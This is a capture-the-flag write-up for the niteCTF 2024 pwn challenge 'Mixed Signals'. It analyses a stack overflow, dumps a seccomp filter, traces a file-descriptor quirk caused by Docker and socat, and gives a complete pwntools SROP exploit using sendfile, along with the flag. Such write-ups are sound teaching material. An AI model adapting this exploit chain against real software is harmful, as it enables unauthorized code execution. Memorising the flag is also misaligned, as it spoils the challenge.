https://ctftime.org/event/2461

# Mixed Signals (pwn)

Answer the call

ncat --ssl mixed-signal.chals.nitectf2024.live 1337

## Analysis

`main` @ `0x40120c`:
- Installs a seccomp filter
- Calls `vuln`
- Exits

`vuln` @ `0x4011eb`:
- Reads up to 300 bytes to the stack
    - Note that the write is offset -16 bytes from the return address of `vuln`
        - This allows us to write up to 16 bytes without disturbing the return address or the memory beyond it
            - This will be important later as we will use `read`'s control over `rax` to perform a `sigreturn` syscall with `rax` equal to 15

### Seccomp Filter

I used seccomp-tools, which can be found here https://github.com/david942j/seccomp-tools, to dump the seccomp filter as follows: 

```C
$ seccomp-tools --dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000028  if (A != sendfile) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```

We can see that, essentially, only `rt_sigreturn`, `read`, `write` and `sendfile` are allowed.

This, in isolation, telegraphs that we should use signal return orientated programming (SROP) and should read the flag with `read` or `sendfile`.

### Docker Signal Confusion

Initially I missed this part of the challenge. That is because you can make a working exploit locally outside of the docker using fd 3.

When building the container you may notice an unusual warning adding --debug to docker gives the following output:

```bash
$ sudo docker --debug build -t foo .
[+] Building 7.9s (11/11) FINISHED                                                                       docker:default
 => [internal] load build definition from Dockerfile                                                               0.0s
 => => transferring dockerfile: 305B                                                                               0.0s
 => [internal] load metadata for docker.io/library/debian:bookworm-slim                                            0.6s
 => [internal] load .dockerignore                                                                                  0.0s
 => => transferring context: 2B                                                                                    0.0s
 => [1/6] FROM docker.io/library/debian:bookworm-slim@sha256:1537a6a1cbc4b4fd401da800ee9480207e7dc1f23560c21259f6  0.0s
 => [internal] load build context                                                                                  0.0s
 => => transferring context: 53B                                                                                   0.0s
 => CACHED [2/6] RUN useradd --no-create-home -u 1000 user                                                         0.0s
 => [3/6] RUN apt update &&     apt install -y socat                                                               6.4s
 => [4/6] WORKDIR /home/user                                                                                       0.1s
 => [5/6] COPY chal flag.txt ./                                                                                    0.1s
 => [6/6] RUN chmod +x chal                                                                                        0.3s
 => exporting to image                                                                                             0.4s
 => => exporting layers                                                                                            0.4s
 => => writing image sha256:dbec2c77396844d6b8688b9e38b76814ceb5f6c673fe0a441e7d48c24ef4bef6                       0.0s
 => => naming to docker.io/library/foo                                                                             0.0s

 1 warning found:
 - JSONArgsRecommended: JSON arguments recommended for CMD to prevent unintended behavior related to OS signals (line 16)
JSON arguments recommended for ENTRYPOINT/CMD to prevent unintended behavior related to OS signals
More info: https://docs.docker.com/go/dockerfile/rule/json-args-recommended/
Dockerfile:16
--------------------
  14 |     #USER user
  15 |
  16 | >>> CMD socat -T60 TCP-LISTEN:1337,reuseaddr,fork EXEC:"./chal"
  17 |
--------------------
```

This suggests that there is something wrong with this line and that it relates to OS signals.

This is explained in more detail here https://docs.docker.com/reference/build-checks/json-args-recommended/.

The net result is that we end up using file descriptors 3 and 4 for sockets related to socat such that our flag is actually using fd 5:

```shell
root@aa3b89f861ad:/proc/88/fd# ls -lah
total 0
dr-x------ 2 root root  7 Dec 14 14:51 .
dr-xr-xr-x 9 root root  0 Dec 14 14:50 ..
lrwx------ 1 root root 64 Dec 14 14:51 0 -> 'socket:[1306821]'
lrwx------ 1 root root 64 Dec 14 14:51 1 -> 'socket:[1306821]'
lrwx------ 1 root root 64 Dec 14 14:51 2 -> /dev/pts/0
lrwx------ 1 root root 64 Dec 14 14:51 3 -> 'socket:[1306824]'
lrwx------ 1 root root 64 Dec 14 14:51 4 -> 'socket:[1306825]'
lr-x------ 1 root root 64 Dec 14 14:51 5 -> /home/user/flag.txt
lrwx------ 1 root root 64 Dec 14 14:51 8 -> 'socket:[1306822]'
```

Note: you could solve the task without learning about this by simply assuming that the flag is using a fd higher than 3 and quickly arrive at 5 this way.

## Solution

1) First rop back to `vuln`
    - This allows us to use the call to `read` to set `rax` indirectly
2) Next rop to a `syscall` gadget
    - This will be a `sigreturn` syscall in practice
3) Provide a `sigreturn` frame that performs a `sendfile` syscall
    - This allows us to copy the flag from the open file descriptor 5 to `FILE_STDOUT`
4) After a delay provide exactly 15 bytes of input to the second call to `vuln`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("mixed-signal.chals.nitectf2024.live", 1337, ssl=True)

rop = ROP(elf)
rop.raw(b"A" * 0x10)
rop.call("vuln")
rop.raw(p64(rop.find_gadget(['syscall']).address))

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_sendfile
frame.rdi = 1  # int out_fd / FILE_STDOUT
frame.rsi = 5  # int in_fd / open("flag.txt")
frame.rdx = 0  # off_t offset
frame.r10 = 64 # size_t count / too much / a guess
frame.rip = rop.find_gadget(['syscall']).address

rop.raw(bytes(frame))

p.sendlineafter(b"pickup!\n", rop.chain())

input()

p.sendline(b"A" * 14) # send 15 bytes total ~ vuln reads them and sets rax = 15/sigreturn

p.interactive() # nite{b0b'5_s1gn4ls_h4v3_b33N_retUrN3D}
```

## Flag
`nite{b0b'5_s1gn4ls_h4v3_b33N_retUrN3D}`

smiley 2024/12/14
